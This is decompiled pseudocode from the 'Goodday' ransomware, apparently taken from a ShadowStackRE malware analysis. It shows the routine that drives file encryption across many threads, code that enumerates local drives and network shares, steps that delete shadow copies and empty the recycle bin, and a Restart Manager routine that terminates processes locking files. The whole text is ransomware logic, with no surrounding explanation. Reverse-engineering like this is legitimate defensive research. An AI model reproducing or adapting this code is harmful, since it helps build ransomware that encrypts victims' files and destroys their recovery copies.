////////////////////////////////////////////////////////////
// Goodday Ransomware
// https://www.shadowstackre.com/analysis/goodday
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////
void __cdecl ProcessFilesEncryption(int a1, LPCWSTR *a2)
{
  HANDLE CurrentProcess; // eax
  HANDLE Thread; // eax
  HANDLE v4; // eax
  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-40h] BYREF
  DWORD dwNumberOfProcessors; // [esp+24h] [ebp-1Ch] BYREF
  int v7; // [esp+28h] [ebp-18h] BYREF
  unsigned int j; // [esp+2Ch] [ebp-14h]
  unsigned int i; // [esp+30h] [ebp-10h]
  HANDLE *lpHandles; // [esp+34h] [ebp-Ch]
  LPVOID lpMem; // [esp+38h] [ebp-8h]
  int v12; // [esp+3Ch] [ebp-4h] BYREF
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  GetSystemInfo(&SystemInfo);
  lpMem = 0;
  lpHandles = 0;
  dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;
  v7 = 0;
  v12 = 0;
  while ( dword_47C71C < 3 )
  {
    IfDebugRelaunch(&a1, a2);
    CheckIfProcessRunning(15, (int)processExeList);// Check if one of the processes exist
    if ( dword_47C71C )
    {
      if ( dword_47C71C == 1 || dword_47C71C == 2 )
      {
        CurrentProcess = GetCurrentProcess();
        SetPriorityClass(CurrentProcess, 0x80u);
        CreateSemaphore(&dwNumberOfProcessors, &v7, &v12, 1, 2u, 1, 1);
      }
    }
    else
    {
      CreateSemaphore(&dwNumberOfProcessors, &v7, &v12, 4, 2u, 6, 3);
      if ( dword_479000 == 2 )
      {
        DeleteShadowCopy();                     // Disable WOW64 redirect, and delete shadow copies
        SHEmptyRecycleBinA(0, 0, 7u);
      }
    }
    lpMem = AllocHeap(4 * v12);
    lpHandles = (HANDLE *)AllocHeap(4 * v12);
    if ( lpMem && lpHandles )
    {
      sub_4215B0((int)lpMem, 0, 4 * v12);
      sub_4215B0((int)lpHandles, 0, 4 * v12);
      for ( i = 0; i < v12; ++i )
      {
        Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptorThread, (LPVOID)1, 0, 0);
        *((_DWORD *)lpMem + i) = Thread;
        v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptorThread, 0, 0, 0);
        lpHandles[i] = v4;
      }
      if ( dword_479000 == 2 )
      {
        if ( dword_47C71C )
        {
          if ( dword_47C71C == 1 )
          {
            FileAndNetworkDiscovery(a1, (int)a2, ::a2);
          }
          else if ( dword_47C71C == 2 )
          {
            FileAndNetworkDiscovery(a1, (int)a2, a3);
          }
        }
        else
        {
          FileAndNetworkDiscovery(a1, (int)a2, Name);
        }
      }
      else if ( (unsigned int)dword_479000 <= 1 )
      {
        sub_4185C0((int)&savedregs, (const WCHAR *)dword_47C724);
      }
      sub_418480((int)&v7, (int)&v12, (HANDLE *)lpMem, (int)&unk_47C6A8);
      sub_418480((int)&v7, (int)&v12, lpHandles, (int)&unk_47C678);
      for ( j = 0; j < v12; ++j )
      {
        CloseHandle(*((HANDLE *)lpMem + j));
        CloseHandle(lpHandles[j]);
      }
      sub_421580(lpMem);
      sub_421580(lpHandles);
    }
    ++dword_47C71C;
  }
}

int __cdecl FileAndNetworkDiscovery(int a1, int a2, LPCSTR lpName)
{
  int result; // eax
  unsigned int v4; // [esp+4h] [ebp-8h]
  WCHAR i; // [esp+8h] [ebp-4h]

  result = (int)OpenMutexA(0x1F0001u, 0, lpName);
  if ( !result )
  {
    CreateMutexA(0, 0, lpName);
    if ( dword_47C728 == 1 )
      NetworkEnumerationDiscovery(0);
    GetDriveLetters();
    result = GetLogicalDrives();
    v4 = result;
    if ( result )
    {
      result = 65;
      for ( i = 65; i <= 0x5Au; ++i )
      {
        result = v4 & 1;
        if ( (v4 & 1) != 0 )
          result = (int)GetDriveType(i);
        v4 >>= 1;
      }
    }
    if ( !dword_47C728 )
      return NetworkEnumerationDiscovery(0);
  }
  return result;
}

int __cdecl NetworkEnumerationDiscovery(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  HANDLE hEnum; // [esp+0h] [ebp-10h] BYREF
  DWORD cCount; // [esp+4h] [ebp-Ch] BYREF
  DWORD BufferSize; // [esp+8h] [ebp-8h] BYREF
  DWORD i; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF
  LPNETRESOURCEW lpNetResourcea; // [esp+18h] [ebp+8h]

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, lpNetResource, &hEnum);
  if ( !result )
  {
    lpNetResourcea = (LPNETRESOURCEW)AllocHeap(BufferSize);
    if ( lpNetResourcea )
    {
      while ( !WNetEnumResourceW(hEnum, &cCount, lpNetResourcea, &BufferSize) )
      {
        for ( i = 0; i < cCount; ++i )
        {
          if ( (lpNetResourcea[i].dwUsage & 2) != 0 )
            NetworkEnumerationDiscovery(&lpNetResourcea[i]);
          else
            DiscoverRemoteFile((int)&savedregs, lpNetResourcea[i].lpRemoteName);
        }
      }
      sub_421580(lpNetResourcea);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

DWORD __thiscall UnlockFilesFromProcess(_DWORD *this, LPCWSTR a2, DWORD *a3, BOOL *a4)
{
  DWORD result; // eax
  UINT pnProcInfoNeeded; // [esp+0h] [ebp-24h] BYREF
  DWORD dwRebootReasons; // [esp+4h] [ebp-20h] BYREF
  _DWORD *v7; // [esp+8h] [ebp-1Ch]
  UINT pnProcInfo; // [esp+Ch] [ebp-18h] BYREF
  BOOL v9; // [esp+10h] [ebp-14h]
  BOOL v10; // [esp+14h] [ebp-10h]
  HANDLE hProcess; // [esp+18h] [ebp-Ch]
  RM_PROCESS_INFO *__attribute__((__org_arrdim(0,0))) rgAffectedApps; // [esp+1Ch] [ebp-8h]
  UINT i; // [esp+20h] [ebp-4h]

  v7 = this;
  v10 = RmRegisterResources(*a3, 1u, &a2, 0, 0, 0, 0) == 0;
  *a4 = v10;
  if ( v10 )
  {
    pnProcInfo = 10;
    rgAffectedApps = (RM_PROCESS_INFO *)AllocHeap(10);
    v9 = RmGetList(*a3, &pnProcInfoNeeded, &pnProcInfo, rgAffectedApps, &dwRebootReasons) == 0;
    *a4 = v9;
    if ( v9 )
    {
      for ( i = 0; i < pnProcInfo; ++i )
      {
        if ( rgAffectedApps[i].ApplicationType != RmExplorer
          && rgAffectedApps[i].ApplicationType != RmCritical
          && GetCurrentProcessId() != rgAffectedApps[i].Process.dwProcessId )
        {
          hProcess = OpenProcess(0x100001u, 0, rgAffectedApps[i].Process.dwProcessId);
          if ( hProcess != (HANDLE)-1 )
          {
            TerminateProcess(hProcess, 0);
            WaitForSingleObject(hProcess, 0x1388u);
            CloseHandle(hProcess);
          }
        }
      }
    }
    else if ( dword_47C770 )
    {
      sub_421EA0(aBusy_1, &a2, &dword_47C770);
    }
    sub_421580(rgAffectedApps);
  }
  else if ( dword_47C770 )
  {
    sub_421EA0(aBusy_2, &a2, &dword_47C770);
  }
  result = RmEndSession(*a3);
  v7[78] = 0;
  return result;
}
